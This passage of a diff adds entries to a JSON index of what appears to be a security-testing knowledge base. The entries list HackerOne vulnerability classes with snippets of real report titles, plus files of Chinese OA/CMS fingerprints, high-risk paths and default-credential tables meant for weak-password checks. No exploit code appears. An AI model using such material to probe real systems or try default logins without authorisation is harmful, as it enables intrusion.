+   "lines": 44,
+   "summary": "2 份真实报告，如：明確な認証不備および潜在的な中間者攻撃の可能性（Clear Authentica；Broken Authentication: A project additio",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-null-pointer-dereference",
+   "title": "HackerOne null-pointer-dereference",
+   "file": "h1-null-pointer-dereference.md",
+   "category": "内存安全",
+   "lines": 83,
+   "summary": "6 份真实报告，如：NULL Pointer dereference in idn.c；Denial of Service: nghttp2 use of uninit",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-time-of-check-time-of-use-toctou-race-condition",
+   "title": "HackerOne time-of-check-time-of-use-toctou-race-condition",
+   "file": "h1-time-of-check-time-of-use-toctou-race-condition.md",
+   "category": "业务逻辑",
+   "lines": 35,
+   "summary": "3 份真实报告，如：Ability to bypass partner email confirma；TOCTOU Race Condition in HTTP/2 Connecti",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-modification-of-assumed-immutable-data-maid",
+   "title": "HackerOne modification-of-assumed-immutable-data-maid",
+   "file": "h1-modification-of-assumed-immutable-data-maid.md",
+   "category": "配置",
+   "lines": 27,
+   "summary": "1 份真实报告，如：property-expr - Prototype pollution",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-path-traversal",
+   "title": "HackerOne path-traversal",
+   "file": "h1-path-traversal.md",
+   "category": "文件与上传",
+   "lines": 58,
+   "summary": "3 份真实报告，如：Path Traversal and Remote Code Execution；Path Traversal Vulnerability in Lila Pro",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-array-index-underflow",
+   "title": "HackerOne array-index-underflow",
+   "file": "h1-array-index-underflow.md",
+   "category": "内存安全",
+   "lines": 87,
+   "summary": "5 份真实报告，如：Signedness issue in ClassInfo message ha；https://██████ vulnerable to CVE-2020-31",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-authentication-bypass-by-primary-weakness",
+   "title": "HackerOne authentication-bypass-by-primary-weakness",
+   "file": "h1-authentication-bypass-by-primary-weakness.md",
+   "category": "认证",
+   "lines": 23,
+   "summary": "2 份真实报告，如：Missing server identity policy enforceme；Incorrect Parsing of IPv6 Zone ID in cur",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-crlf-injection",
+   "title": "HackerOne crlf-injection",
+   "file": "h1-crlf-injection.md",
+   "category": "注入",
+   "lines": 76,
+   "summary": "5 份真实报告，如：CRLF Injection / Protocol Smuggling in l；HTTP/3 Protocol Smuggling and Header Inj",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-information-exposure-through-sent-data",
+   "title": "HackerOne information-exposure-through-sent-data",
+   "file": "h1-information-exposure-through-sent-data.md",
+   "category": "信息与资产",
+   "lines": 74,
+   "summary": "4 份真实报告，如：Alt-Svc bypasses credential leak protect；Proxy-Authorization header is leaked to ",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-man-in-the-middle",
+   "title": "HackerOne man-in-the-middle",
+   "file": "h1-man-in-the-middle.md",
+   "category": "其他",
+   "lines": 70,
+   "summary": "5 份真实报告，如：Fetching the update json scheme from con；Repositories of datanucleus are fetched ",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-double-free",
+   "title": "HackerOne double-free",
+   "file": "h1-double-free.md",
+   "category": "内存安全",
+   "lines": 81,
+   "summary": "5 份真实报告，如：Double fdrop on a socket through sys_net；CVE-2022-28738: Double free in Regexp co",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-buffer-underflow",
+   "title": "HackerOne buffer-underflow",
+   "file": "h1-buffer-underflow.md",
+   "category": "内存安全",
+   "lines": 54,
+   "summary": "4 份真实报告，如：Buffer overflow in strcpy；Negative size parameter in mb_split",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-allocation-of-resources-without-limits-or-throttling",
+   "title": "HackerOne allocation-of-resources-without-limits-or-throttling",
+   "file": "h1-allocation-of-resources-without-limits-or-throttling.md",
+   "category": "资源消耗",
+   "lines": 50,
+   "summary": "3 份真实报告，如：HTTP/2 CONTINUATION Flood Vulnerability；Memory Leak in libcurl via Location Head",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-insufficient-session-expiration",
+   "title": "HackerOne insufficient-session-expiration",
+   "file": "h1-insufficient-session-expiration.md",
+   "category": "认证",
+   "lines": 54,
+   "summary": "4 份真实报告，如：Can use the Reddit android app as usual ；Web Server Predictable Session ID on Edg",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-weak-password-recovery-mechanism-for-forgotten-password",
+   "title": "HackerOne weak-password-recovery-mechanism-for-forgotten-password",
+   "file": "h1-weak-password-recovery-mechanism-for-forgotten-password.md",
+   "category": "认证",
+   "lines": 57,
+   "summary": "4 份真实报告，如：Cookie steal through content Uri；(Possible) staff account takeover via re",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-cleartext-transmission-of-sensitive-information",
+   "title": "HackerOne cleartext-transmission-of-sensitive-information",
+   "file": "h1-cleartext-transmission-of-sensitive-information.md",
+   "category": "信息与资产",
+   "lines": 61,
+   "summary": "5 份真实报告，如：Insecure WebSocket Usage in curl Documen；Plaintext leakage of DNS requests in Win",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-http-response-splitting",
+   "title": "HackerOne http-response-splitting",
+   "file": "h1-http-response-splitting.md",
+   "category": "协议与架构",
+   "lines": 43,
+   "summary": "2 份真实报告，如：HTTP Smuggling multiple issues in Squid ；RubyのCGIライブラリにHTTPレスポンス分割（HTTPヘッダインジェクショ",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-improper-check-or-handling-of-exceptional-conditions",
+   "title": "HackerOne improper-check-or-handling-of-exceptional-conditions",
+   "file": "h1-improper-check-or-handling-of-exceptional-conditions.md",
+   "category": "配置",
+   "lines": 14,
+   "summary": "1 份真实报告，如：curl proceeds with unsafe connections wh",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-use-of-externally-controlled-format-string",
+   "title": "HackerOne use-of-externally-controlled-format-string",
+   "file": "h1-use-of-externally-controlled-format-string.md",
+   "category": "配置",
+   "lines": 105,
+   "summary": "5 份真实报告，如：CVE-2022-40604: Apache Airflow: Format S；███ ████████ running a vulnerable log4j",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-encoding-error",
+   "title": "HackerOne encoding-error",
+   "file": "h1-encoding-error.md",
+   "category": "协议与架构",
+   "lines": 15,
+   "summary": "1 份真实报告，如：Unicode-to-ASCII conversion on Windows c",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-improper-handling-of-url-encoding-hex-encoding",
+   "title": "HackerOne improper-handling-of-url-encoding-hex-encoding",
+   "file": "h1-improper-handling-of-url-encoding-hex-encoding.md",
+   "category": "协议与架构",
+   "lines": 18,
+   "summary": "1 份真实报告，如：Cache Poisoning",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-malware",
+   "title": "HackerOne malware",
+   "file": "h1-malware.md",
+   "category": "其他",
+   "lines": 49,
+   "summary": "3 份真实报告，如：Vulnerability in GoldSource Engine allow；Malformed save files (.sav) allow to wri",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-information-exposure-through-an-error-message",
+   "title": "HackerOne information-exposure-through-an-error-message",
+   "file": "h1-information-exposure-through-an-error-message.md",
+   "category": "信息与资产",
+   "lines": 42,
+   "summary": "3 份真实报告，如：Lack of rate limiting in https://███/PKI；Able to log in with default ██████g cred",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-external-control-of-critical-state-data",
+   "title": "HackerOne external-control-of-critical-state-data",
+   "file": "h1-external-control-of-critical-state-data.md",
+   "category": "其他",
+   "lines": 28,
+   "summary": "2 份真实报告，如：match；Disclosure of internal information using",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-use-of-hard-coded-credentials",
+   "title": "HackerOne use-of-hard-coded-credentials",
+   "file": "h1-use-of-hard-coded-credentials.md",
+   "category": "认证",
+   "lines": 89,
+   "summary": "4 份真实报告，如：Exposed valid AWS, Mysql, Sendgrid and o；Hardcoded AWS credentials in ███████.msi",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-missing-required-cryptographic-step",
+   "title": "HackerOne missing-required-cryptographic-step",
+   "file": "h1-missing-required-cryptographic-step.md",
+   "category": "加密",
+   "lines": 27,
+   "summary": "2 份真实报告，如：Constant-time comparison is not always i；Missing AES-GCM Authentication Tag Valid",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-llm01-prompt-injection",
+   "title": "HackerOne llm01-prompt-injection",
+   "file": "h1-llm01-prompt-injection.md",
+   "category": "注入",
+   "lines": 15,
+   "summary": "1 份真实报告，如：Prompt Injection via GitHub Patch in Bra",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-missing-authorization",
+   "title": "HackerOne missing-authorization",
+   "file": "h1-missing-authorization.md",
+   "category": "越权",
+   "lines": 40,
+   "summary": "2 份真实报告，如：Unrestricted access to quiesce functiona；Access token stealing.",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-password-in-configuration-file",
+   "title": "HackerOne password-in-configuration-file",
+   "file": "h1-password-in-configuration-file.md",
+   "category": "认证",
+   "lines": 28,
+   "summary": "2 份真实报告，如：Git repo on https://██████.mil/ disclose；Insecure Zendesk SSO implementation by g",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-use-of-hard-coded-cryptographic-key",
+   "title": "HackerOne use-of-hard-coded-cryptographic-key",
+   "file": "h1-use-of-hard-coded-cryptographic-key.md",
+   "category": "加密",
+   "lines": 21,
+   "summary": "2 份真实报告，如：Exposure of Hard-coded Private Keys and ；Slack DTLS uses a private key that is in",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-authentication-bypass",
+   "title": "HackerOne authentication-bypass",
+   "file": "h1-authentication-bypass.md",
+   "category": "认证",
+   "lines": 27,
+   "summary": "2 份真实报告，如：Account Takeover in Password Reset Funct；Stealing SSO Login Tokens (snappublisher",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-relative-path-traversal",
+   "title": "HackerOne relative-path-traversal",
+   "file": "h1-relative-path-traversal.md",
+   "category": "文件与上传",
+   "lines": 19,
+   "summary": "2 份真实报告，如：CVE-█████-35813 in █████；Path Traversal in SFTP QUOTE command lea",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-information-exposure-through-debug-information",
+   "title": "HackerOne information-exposure-through-debug-information",
+   "file": "h1-information-exposure-through-debug-information.md",
+   "category": "信息与资产",
+   "lines": 106,
+   "summary": "5 份真实报告，如：Information Disclosure through DEBUG at ；Trace.axd page leaks sensitive informati",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-incorrect-authorization",
+   "title": "HackerOne incorrect-authorization",
+   "file": "h1-incorrect-authorization.md",
+   "category": "越权",
+   "lines": 55,
+   "summary": "4 份真实报告，如：IDOR Leads To  User Profile Modification；Any meeting chat history can be read and",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-type-confusion",
+   "title": "HackerOne type-confusion",
+   "file": "h1-type-confusion.md",
+   "category": "其他",
+   "lines": 23,
+   "summary": "2 份真实报告，如：Incorrect Type Conversion in interpretin；Insufficient Type Check leading to Devel",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-use-of-inherently-dangerous-function",
+   "title": "HackerOne use-of-inherently-dangerous-function",
+   "file": "h1-use-of-inherently-dangerous-function.md",
+   "category": "其他",
+   "lines": 33,
+   "summary": "2 份真实报告，如：Unexpected input validation of octal lit；URL Spoof / Brave Shield Bypass",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-missing-encryption-of-sensitive-data",
+   "title": "HackerOne missing-encryption-of-sensitive-data",
+   "file": "h1-missing-encryption-of-sensitive-data.md",
+   "category": "加密",
+   "lines": 52,
+   "summary": "3 份真实报告，如：Waketime Payment Gateway Vulnerability；ChaCha20-Poly1305 with long nonces",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-reliance-on-cookies-without-validation-and-integrity-checking-in-a-security-decision",
+   "title": "HackerOne reliance-on-cookies-without-validation-and-integrity-checking-in-a-security-decision",
+   "file": "h1-reliance-on-cookies-without-validation-and-integrity-checking-in-a-security-decision.md",
+   "category": "其他",
+   "lines": 30,
+   "summary": "2 份真实报告，如：Отправка писем с произвольным текстом/кл；Ruby CVE-2021-41819: Cookie Prefix Spoof",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-unrestricted-upload-of-file-with-dangerous-type",
+   "title": "HackerOne unrestricted-upload-of-file-with-dangerous-type",
+   "file": "h1-unrestricted-upload-of-file-with-dangerous-type.md",
+   "category": "文件与上传",
+   "lines": 45,
+   "summary": "4 份真实报告，如：Unrestricted File Upload at ██████████；Stored XSS on ████████helpdesk",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-phishing",
+   "title": "HackerOne phishing",
+   "file": "h1-phishing.md",
+   "category": "其他",
+   "lines": 64,
+   "summary": "4 份真实报告，如：Address Bar Spoofing on TOR Browser；Github Account hijack through broken lin",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-external-control-of-file-name-or-path",
+   "title": "HackerOne external-control-of-file-name-or-path",
+   "file": "h1-external-control-of-file-name-or-path.md",
+   "category": "文件与上传",
+   "lines": 17,
+   "summary": "1 份真实报告，如：Arbitrary Configuration File Inclusion: ",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-session-fixation",
+   "title": "HackerOne session-fixation",
+   "file": "h1-session-fixation.md",
+   "category": "认证",
+   "lines": 38,
+   "summary": "2 份真实报告，如：████████ portal is open to enumeration o；Cookie injection from non-secure context",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-asi05-unexpected-code-execution-rce",
+   "title": "HackerOne asi05-unexpected-code-execution-rce",
+   "file": "h1-asi05-unexpected-code-execution-rce.md",
+   "category": "其他",
+   "lines": 13,
+   "summary": "1 份真实报告，如：MQTT CONNACK Packet Type Bypass leads to",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-leftover-debug-code-backdoor",
+   "title": "HackerOne leftover-debug-code-backdoor",
+   "file": "h1-leftover-debug-code-backdoor.md",
+   "category": "其他",
+   "lines": 19,
+   "summary": "1 份真实报告，如：███ on https://████ enable ███ scraping,",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-exposure-of-data-element-to-wrong-session",
+   "title": "HackerOne exposure-of-data-element-to-wrong-session",
+   "file": "h1-exposure-of-data-element-to-wrong-session.md",
+   "category": "认证",
+   "lines": 15,
+   "summary": "1 份真实报告，如：State Isolation Failure in Multiplexed C",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-storing-passwords-in-a-recoverable-format",
+   "title": "HackerOne storing-passwords-in-a-recoverable-format",
+   "file": "h1-storing-passwords-in-a-recoverable-format.md",
+   "category": "认证",
+   "lines": 29,
+   "summary": "2 份真实报告，如：External storage app saves password for ；Password Cracking - Weak Password Used t",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-off-by-one-error",
+   "title": "HackerOne off-by-one-error",
+   "file": "h1-off-by-one-error.md",
+   "category": "其他",
+   "lines": 30,
+   "summary": "2 份真实报告，如：Exim off-by-one RCE vulnerability；urlapi: off-by-one in custom scheme vali",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-xml-entity-expansion",
+   "title": "HackerOne xml-entity-expansion",
+   "file": "h1-xml-entity-expansion.md",
+   "category": "其他",
+   "lines": 22,
+   "summary": "1 份真实报告，如：Pippo XML Entity Expansion (Billion Laug",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-user-interface-ui-misrepresentation-of-critical-information",
+   "title": "HackerOne user-interface-ui-misrepresentation-of-critical-information",
+   "file": "h1-user-interface-ui-misrepresentation-of-critical-information.md",
+   "category": "信息与资产",
+   "lines": 31,
+   "summary": "2 份真实报告，如：Incorrect security UI of files' download；Mailsploit: a sender spoofing bug in ove",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-reliance-on-untrusted-inputs-in-a-security-decision",
+   "title": "HackerOne reliance-on-untrusted-inputs-in-a-security-decision",
+   "file": "h1-reliance-on-untrusted-inputs-in-a-security-decision.md",
+   "category": "其他",
+   "lines": 24,
+   "summary": "1 份真实报告，如：Helpdesk Takeover at dmc.datastax.com",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-unverified-password-change",
+   "title": "HackerOne unverified-password-change",
+   "file": "h1-unverified-password-change.md",
+   "category": "认证",
+   "lines": 25,
+   "summary": "2 份真实报告，如：Password authentication when changing in；Information can be changed without a pas",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-client-side-enforcement-of-server-side-security",
+   "title": "HackerOne client-side-enforcement-of-server-side-security",
+   "file": "h1-client-side-enforcement-of-server-side-security.md",
+   "category": "其他",
+   "lines": 42,
+   "summary": "4 份真实报告，如：Ability to  bypass Admin override on Clo；Ability to bypass locked Cloudflare WARP",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-write-what-where-condition",
+   "title": "HackerOne write-what-where-condition",
+   "file": "h1-write-what-where-condition.md",
+   "category": "其他",
+   "lines": 34,
+   "summary": "1 份真实报告，如：OP_SCALL in LHS of a OP_ASGN resulting i",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-xml-injection",
+   "title": "HackerOne xml-injection",
+   "file": "h1-xml-injection.md",
+   "category": "注入",
+   "lines": 48,
+   "summary": "2 份真实报告，如：XML Injection / External Service Interac；XML Injection on https://www.█████████ (",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-file-and-directory-information-exposure",
+   "title": "HackerOne file-and-directory-information-exposure",
+   "file": "h1-file-and-directory-information-exposure.md",
+   "category": "信息与资产",
+   "lines": 35,
+   "summary": "2 份真实报告，如：Arbitrary File Reading leads to RCE in t；Open FTP server on a DoD system",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-missing-critical-step-in-authentication",
+   "title": "HackerOne missing-critical-step-in-authentication",
+   "file": "h1-missing-critical-step-in-authentication.md",
+   "category": "认证",
+   "lines": 15,
+   "summary": "1 份真实报告，如：JWT audience claim is not verified",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-untrusted-search-path",
+   "title": "HackerOne untrusted-search-path",
+   "file": "h1-untrusted-search-path.md",
+   "category": "文件与上传",
+   "lines": 19,
+   "summary": "1 份真实报告，如：Node.js - DLL Hijacking on Windows",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-use-of-cache-containing-sensitive-information",
+   "title": "HackerOne use-of-cache-containing-sensitive-information",
+   "file": "h1-use-of-cache-containing-sensitive-information.md",
+   "category": "信息与资产",
+   "lines": 30,
+   "summary": "1 份真实报告，如：Cache Deception Allows Account Takeover",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-blind-sql-injection",
+   "title": "HackerOne blind-sql-injection",
+   "file": "h1-blind-sql-injection.md",
+   "category": "注入",
+   "lines": 29,
+   "summary": "1 份真实报告，如：Blind SQL injection on id.indrive.com",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-incorrect-calculation-of-buffer-size",
+   "title": "HackerOne incorrect-calculation-of-buffer-size",
+   "file": "h1-incorrect-calculation-of-buffer-size.md",
+   "category": "内存安全",
+   "lines": 30,
+   "summary": "2 份真实报告，如：Zip bomb；size_t-to-int vulnerability in exFAT lea",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-use-of-hard-coded-password",
+   "title": "HackerOne use-of-hard-coded-password",
+   "file": "h1-use-of-hard-coded-password.md",
+   "category": "认证",
+   "lines": 20,
+   "summary": "1 份真实报告，如：hardcoded password stored in javascript ",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-exposed-dangerous-method-or-function",
+   "title": "HackerOne exposed-dangerous-method-or-function",
+   "file": "h1-exposed-dangerous-method-or-function.md",
+   "category": "其他",
+   "lines": 22,
+   "summary": "1 份真实报告，如：Open memory dump method leaking customer",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-missing-authentication-for-critical-function",
+   "title": "HackerOne missing-authentication-for-critical-function",
+   "file": "h1-missing-authentication-for-critical-function.md",
+   "category": "认证",
+   "lines": 23,
+   "summary": "2 份真实报告，如：Authentication bypass  for  ███  leads t；Token leak in security challenge flow al",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-use-of-cryptographically-weak-pseudo-random-number-generator-prng",
+   "title": "HackerOne use-of-cryptographically-weak-pseudo-random-number-generator-prng",
+   "file": "h1-use-of-cryptographically-weak-pseudo-random-number-generator-prng.md",
+   "category": "加密",
+   "lines": 18,
+   "summary": "1 份真实报告，如：Weak randomness in WebCrypto keygen",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-inclusion-of-functionality-from-untrusted-control-sphere",
+   "title": "HackerOne inclusion-of-functionality-from-untrusted-control-sphere",
+   "file": "h1-inclusion-of-functionality-from-untrusted-control-sphere.md",
+   "category": "其他",
+   "lines": 17,
+   "summary": "1 份真实报告，如：important: Apache HTTP Server may use ex",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-download-of-code-without-integrity-check",
+   "title": "HackerOne download-of-code-without-integrity-check",
+   "file": "h1-download-of-code-without-integrity-check.md",
+   "category": "其他",
+   "lines": 18,
+   "summary": "1 份真实报告，如：RCE on build server via misconfigured pi",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-use-of-a-broken-or-risky-cryptographic-algorithm",
+   "title": "HackerOne use-of-a-broken-or-risky-cryptographic-algorithm",
+   "file": "h1-use-of-a-broken-or-risky-cryptographic-algorithm.md",
+   "category": "加密",
+   "lines": 27,
+   "summary": "2 份真实报告，如：0 Click account takeover via timed reque；Inadequate Cryptographic Key Size and In",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-forced-browsing",
+   "title": "HackerOne forced-browsing",
+   "file": "h1-forced-browsing.md",
+   "category": "其他",
+   "lines": 13,
+   "summary": "1 份真实报告，如：One Click Account Hijacking via Unvalida",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-incorrect-privilege-assignment",
+   "title": "HackerOne incorrect-privilege-assignment",
+   "file": "h1-incorrect-privilege-assignment.md",
+   "category": "越权",
+   "lines": 13,
+   "summary": "1 份真实报告，如：A potential risk in the experimental-pro",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-use-of-default-credentials",
+   "title": "HackerOne use-of-default-credentials",
+   "file": "h1-use-of-default-credentials.md",
+   "category": "认证",
+   "lines": 18,
+   "summary": "1 份真实报告，如：Default Credentials on Kinetic Core Syst",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-plaintext-storage-of-a-password",
+   "title": "HackerOne plaintext-storage-of-a-password",
+   "file": "h1-plaintext-storage-of-a-password.md",
+   "category": "认证",
+   "lines": 24,
+   "summary": "2 份真实报告，如：Arbitrary File Reading on Uber SSL VPN；Password of failed (2FA) login attempt i",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-externally-controlled-reference-to-a-resource-in-another-sphere",
+   "title": "HackerOne externally-controlled-reference-to-a-resource-in-another-sphere",
+   "file": "h1-externally-controlled-reference-to-a-resource-in-another-sphere.md",
+   "category": "配置",
+   "lines": 23,
+   "summary": "2 份真实报告，如：Subdomain takeover of v.zego.com；Subdomain takeover of mydailydev.starbuc",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-file-manipulation",
+   "title": "HackerOne file-manipulation",
+   "file": "h1-file-manipulation.md",
+   "category": "文件与上传",
+   "lines": 18,
+   "summary": "1 份真实报告，如：Overwrite any file of the web server",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-using-components-with-known-vulnerabilities",
+   "title": "HackerOne using-components-with-known-vulnerabilities",
+   "file": "h1-using-components-with-known-vulnerabilities.md",
+   "category": "其他",
+   "lines": 28,
+   "summary": "1 份真实报告，如：CVE-2020-5902",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-embedded-malicious-code",
+   "title": "HackerOne embedded-malicious-code",
+   "file": "h1-embedded-malicious-code.md",
+   "category": "其他",
+   "lines": 21,
+   "summary": "1 份真实报告，如：flatmap-stream malicious package (distri",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-file-content-injection",
+   "title": "HackerOne file-content-injection",
+   "file": "h1-file-content-injection.md",
+   "category": "注入",
+   "lines": 24,
+   "summary": "1 份真实报告，如：DNN - Unrestricted Arbitrary File Upload",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-execution-with-unnecessary-privileges",
+   "title": "HackerOne execution-with-unnecessary-privileges",
+   "file": "h1-execution-with-unnecessary-privileges.md",
+   "category": "越权",
+   "lines": 20,
+   "summary": "1 份真实报告，如：One Click Code Execution via File",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-concurrent-execution-using-shared-resource-with-improper-synchronization-race-condition",
+   "title": "HackerOne concurrent-execution-using-shared-resource-with-improper-synchronization-race-condition",
+   "file": "h1-concurrent-execution-using-shared-resource-with-improper-synchronization-race-condition.md",
+   "category": "资源消耗",
+   "lines": 14,
+   "summary": "1 份真实报告，如：Race Condition Enables Bypassing Verific",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-improper-initialization",
+   "title": "HackerOne improper-initialization",
+   "file": "h1-improper-initialization.md",
+   "category": "其他",
+   "lines": 13,
+   "summary": "1 份真实报告，如：Timeout-based race conditions make Uint8",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-reflected-xss",
+   "title": "HackerOne reflected-xss",
+   "file": "h1-reflected-xss.md",
+   "category": "XSS",
+   "lines": 22,
+   "summary": "1 份真实报告，如：Reflected XSS on Amazon EC2 Instance",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-reusing-a-nonce-key-pair-in-encryption",
+   "title": "HackerOne reusing-a-nonce-key-pair-in-encryption",
+   "file": "h1-reusing-a-nonce-key-pair-in-encryption.md",
+   "category": "加密",
+   "lines": 24,
+   "summary": "1 份真实报告，如：i can join without user and pass in this",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-use-of-insufficiently-random-values",
+   "title": "HackerOne use-of-insufficiently-random-values",
+   "file": "h1-use-of-insufficiently-random-values.md",
+   "category": "其他",
+   "lines": 16,
+   "summary": "1 份真实报告，如：The initial E2EE password generated by R",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-use-of-a-key-past-its-expiration-date",
+   "title": "HackerOne use-of-a-key-past-its-expiration-date",
+   "file": "h1-use-of-a-key-past-its-expiration-date.md",
+   "category": "其他",
+   "lines": 13,
+   "summary": "1 份真实报告，如：In App purchase Hack",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-inclusion-of-sensitive-information-in-an-include-file",
+   "title": "HackerOne inclusion-of-sensitive-information-in-an-include-file",
+   "file": "h1-inclusion-of-sensitive-information-in-an-include-file.md",
+   "category": "信息与资产",
+   "lines": 13,
+   "summary": "1 份真实报告，如：Critical Information Disclosure via /tal",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-improper-export-of-android-application-components",
+   "title": "HackerOne improper-export-of-android-application-components",
+   "file": "h1-improper-export-of-android-application-components.md",
+   "category": "其他",
+   "lines": 13,
+   "summary": "1 份真实报告，如：Multiple bugs leads to RCE on TikTok for",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-improper-neutralization-of-http-headers-for-scripting-syntax",
+   "title": "HackerOne improper-neutralization-of-http-headers-for-scripting-syntax",
+   "file": "h1-improper-neutralization-of-http-headers-for-scripting-syntax.md",
+   "category": "其他",
+   "lines": 13,
+   "summary": "1 份真实报告，如：Host header injection leads to account t",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-weak-cryptography-for-passwords",
+   "title": "HackerOne weak-cryptography-for-passwords",
+   "file": "h1-weak-cryptography-for-passwords.md",
+   "category": "认证",
+   "lines": 15,
+   "summary": "1 份真实报告，如：User Account has been taken out",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-insecure-temporary-file",
+   "title": "HackerOne insecure-temporary-file",
+   "file": "h1-insecure-temporary-file.md",
+   "category": "文件与上传",
+   "lines": 13,
+   "summary": "1 份真实报告，如：UNRESTRICTED FILE UPLOAD AT chat.makerda",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "cn-product-fingerprints",
+   "title": "国产 OA/CMS/中间件指纹 + 高危路径 + 高频参数",
+   "file": "cn-product-fingerprints.md",
+   "category": "国产系统",
+   "lines": 516,
+   "summary": "致远/通达/泛微/WebPlus/金智等国产系统指纹与默认高危路径，含 WooYun 提炼的高频参数",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "cn-default-credentials",
+   "title": "国产系统默认口令表",
+   "file": "cn-default-credentials.md",
+   "category": "国产系统",
+   "lines": 275,
+   "summary": "国产 OA/中间件/数据库/设备的出厂默认账号口令，撞库与弱口令首查",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "cn-dict-index",
+   "title": "国产战场字典总索引",
+   "file": "cn-dict-index.md",
+   "category": "国产系统",
+   "lines": 45,
+   "summary": "国产 SRC 相对英文词典的缺口说明与索引",
+   "stub": false,
